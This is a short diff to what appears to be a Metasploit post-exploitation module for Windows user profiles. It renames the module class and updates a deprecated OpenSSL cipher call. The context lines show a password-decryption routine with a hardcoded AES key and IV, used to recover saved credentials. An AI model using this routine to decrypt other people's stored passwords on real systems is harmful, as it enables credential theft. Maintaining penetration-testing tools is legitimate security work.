@@ -7,7 +7,7 @@ require 'msf/core'
 require 'rex'
 require 'openssl'
 
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
 
   include Msf::Post::Windows::UserProfiles
   include Msf::Post::File
@@ -45,7 +45,7 @@ class Metasploit3 < Msf::Post
   # decrypt password
   def decrypt(pass)
     pass = Rex::Text.decode_base64(pass) if is_base64?(pass)
-    cipher = OpenSSL::Cipher::Cipher.new 'aes-256-cbc'
+    cipher = OpenSSL::Cipher.new 'aes-256-cbc'
     cipher.decrypt
     cipher.key = "hcxilkqbbhczfeultgbskdmaunivmfuo"
     cipher.iv = "ryojvlzmdalyglrj"
